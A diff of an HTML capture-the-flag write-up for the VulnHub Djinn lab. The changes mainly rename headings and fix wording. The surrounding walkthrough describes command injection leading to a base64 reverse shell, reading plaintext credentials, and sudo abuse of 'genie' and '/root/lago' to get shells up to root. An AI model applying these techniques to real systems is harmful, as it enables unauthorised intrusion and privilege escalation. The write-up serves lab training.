@@ -18,16 +18,16 @@ layout: default
         <li><a href="#summary">Summary</a></li>
         <li><a href="#portscan">Port Scanning</a></li>
         <li><a href="#infogather">Information Gathering</a></li>
-        <li><a href="#foothold">Foothold</a></li>
-        <li><a href="#nitish">Privesc - nitish</a></li>
-        <li><a href="#sam">Privesc - sam</a></li>
-        <li><a href="#root">Privesc Method #1 - root</a></li>
-        <li><a href="#root2">Privesc Method #2 - root</a></li>
+        <li><a href="#www-data">Shell - www-data</a></li>
+        <li><a href="#nitish">Shell - nitish</a></li>
+        <li><a href="#sam">Shell - sam</a></li>
+        <li><a href="#root">Shell Method #1 - root</a></li>
+        <li><a href="#root2">Shell Method #2 - root</a></li>
     </ul>
 
     <h2><a id="summary">Summary</a></h2>
 
-    <p>Djinn has two paths.  One path leads directly to root over port 1337.  This requires a python command injection of a base64 encoded reverse shell.  The shell returns as root.  The other path involves finding a web directory that allows us to execute commands.  Command execution filters for certain characters so we are forced to use a base64 encoded payload for our reverse shell.  This leads to the www-data low priv shell.  We find credentials in a file for the user nitish.  Once we switch to nitish we find that we have permissions to a sudo command.  The flag required to privesc using this sudo command is in the manual, it is not shown in the output from the -h help flag.  Using the sudo command we gain a shell as the user sam.  Sam also has a sudo ability that allows us to privesc to root.  Decompiling a file in Sam's home directory provides us with the informatio needed to exploit the sudo command in order to gain a root shell.</p>
+    <p>Djinn has two paths.  One path leads directly to root over port 1337.  This requires a python command injection of a base64 encoded reverse shell.  The shell returns as root.  The other path involves finding a web directory that allows us to execute commands.  Command execution filters for certain characters so we are forced to use a base64 encoded payload for our reverse shell.  This leads to the www-data low priv shell.  We find credentials in a file for the user nitish.  Once we switch to nitish we find that we have permissions to a sudo command.  The flag required to privesc using this sudo command is in the manual, it is not shown in the output from the -h help flag.  Using the sudo command we gain a shell as the user sam.  Sam also has a sudo ability that allows us to privesc to root.  Decompiling a file in Sam's home directory provides us with the information needed to exploit the sudo command in order to gain a root shell.</p>
 
     <h2><a id="portscan">Port Scanning</a></h2>
 
@@ -52,7 +52,7 @@ layout: default
 &boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/Djinn/WebEnum]&#13;&#10;&boxur;&HorizontalLine;$ gobuster dir -u http://10.0.0.20:7331/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt                     &#13;&#10;===============================================================&#13;&#10;Gobuster v3.1.0&#13;&#10;by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)&#13;&#10;===============================================================&#13;&#10;[+] Url:                     http://10.0.0.20:7331/&#13;&#10;[+] Method:                  GET&#13;&#10;[+] Threads:                 10&#13;&#10;[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt&#13;&#10;[+] Negative Status codes:   404&#13;&#10;[+] User Agent:              gobuster/3.1.0&#13;&#10;[+] Timeout:                 10s&#13;&#10;===============================================================&#13;&#10;2021/09/24 20:17:29 Starting gobuster in directory enumeration mode&#13;&#10;===============================================================&#13;&#10;/wish                 (Status: 200) [Size: 385]&#13;&#10;/genie                (Status: 200) [Size: 1676]&#13;&#10;                                                &#13;&#10;===============================================================&#13;&#10;2021/09/24 20:18:01 Finished&#13;&#10;===============================================================
     </pre>
 
-    <li>This reveals two directories.  The /wish directory leads us to a reverse shell.  On this page we are able to submit commands.  When we submit "whoami" we see www-data returns in the URL that we get redirected to.  So it appears we are getting command execution.  I did this in Burp as shown below.</li>
+    <li>Running gobuster against the web server reveals two directories.  The /wish directory leads us to a reverse shell.  On this page we are able to submit commands.  When we submit "whoami" we see www-data returns in the URL that we get redirected to.  So it appears we are getting command execution.  I did this in Burp as shown below.</li>
 
     <img src="../images/djinn/injection_spot.png">
 
@@ -63,11 +63,14 @@ layout: default
     </ul>
 
     <br>
-    <h2><a id="foothold">Foothold</a></h2>
+    <h2><a id="www-data">Shell - www-data</a></h2>
 
-    <li>Now that I have verified the command works, I execute the command against Djinn.  I also url-encode the command by highlighting the payload and pressing ctrl+u</li>
+    <li>Now that I have verified the command works, I execute the command against the web server.  I also url-encode the command by highlighting the payload and pressing ctrl+u</li>
 
     <img src="../images/djinn/rev_shell.png">
+
+    <br>
+    <br>
 
     <li>After getting shell I take a look at the file /opt/80/app.py which is the directory that our shell starts in</li>
     
@@ -83,7 +86,7 @@ www-data@djinn:/opt$ cat /home/nitish/.dev/creds.txt&#13;&#10;nitish:p4ssw0rdStr
     </pre>
 
     <br>
-    <h2><a id="nitish">Privesc - nitish</a></h2>
+    <h2><a id="nitish">Shell - nitish</a></h2>
 
     <li>I use the "su" command to switch to this user.</li>
 
@@ -96,6 +99,8 @@ www-data@djinn:/opt$ su nitish &#13;&#10;Password: &#13;&#10;nitish@djinn:/opt$
     <pre>
 nitish@djinn:~$ sudo -l&#13;&#10;Matching Defaults entries for nitish on djinn:&#13;&#10;    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin&#13;&#10;&#13;&#10;User nitish may run the following commands on djinn:&#13;&#10;    (sam) NOPASSWD: /usr/bin/genie
     </pre>
+
+    <h2><a id="sam">Shell - sam</a></h2>
 
     <li>nitish appears to have sudo permissions to run /usr/bin/genie as the user sam.  While investigating the program "genie" we find a few flags we can use.</li>
 
@@ -113,15 +118,14 @@ nitish@djinn:~$ sudo -u sam /usr/bin/genie -h&#13;&#10;usage: genie [-h] [-g] [-
 nitish@djinn:~$ sudo -u sam /usr/bin/genie -cmd anything&#13;&#10;my man!!&#13;&#10;$ id        &#13;&#10;uid=1000(sam) gid=1000(sam) groups=1000(sam),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)&#13;&#10;$ python3 -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;);&quot;&#13;&#10;sam@djinn:~$ 
     </pre>
 
-    <br>
-    <h2><a id="sam">Privesc - sam</a></h2>
-
     <li>As sam I again, check "sudo -l" for any sudo permissions.</li>
 
     <pre>
 sam@djinn:~$ sudo -l&#13;&#10;Matching Defaults entries for sam on djinn:&#13;&#10;    env_reset, mail_badpass,&#13;&#10;    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin&#13;&#10;&#13;&#10;User sam may run the following commands on djinn:&#13;&#10;    (root) NOPASSWD: /root/lago
     </pre>
 
+    <h2><a id="root">Shell Method #1 - Root</a></h2>
+    
     <li>Sam has sudo permissions to use the program /root/lago as root.  I investigate the program a bit.</li>
 
     <pre>
@@ -132,7 +136,6 @@ sam@djinn:~$ sudo /root/lago&#13;&#10;What do you want to do ?&#13;&#10;1 - Be n
 
 
     <br>
-    <h2><a id="root">Privesc Method #1 - Root</a></h2>
 
     <li>There is a file named ".pyc" in Sam's home directory that looks like the source code behind /root/lago.  I initially use the command "strings" to examine the file contents.</li>
 
@@ -222,7 +225,7 @@ uid=0(root) gid=0(root) groups=0(root)
     <li>Root shell achieved.</li>
 
     <br>
-    <h2><a id="root2">Privesc Method #2 - Root</a></h2>
+    <h2><a id="root2">Shell Method #2 - Root</a></h2>
 
     <li>The alternative route to root is through port 1337.  Port 1337 presents us with a math game</li>
 
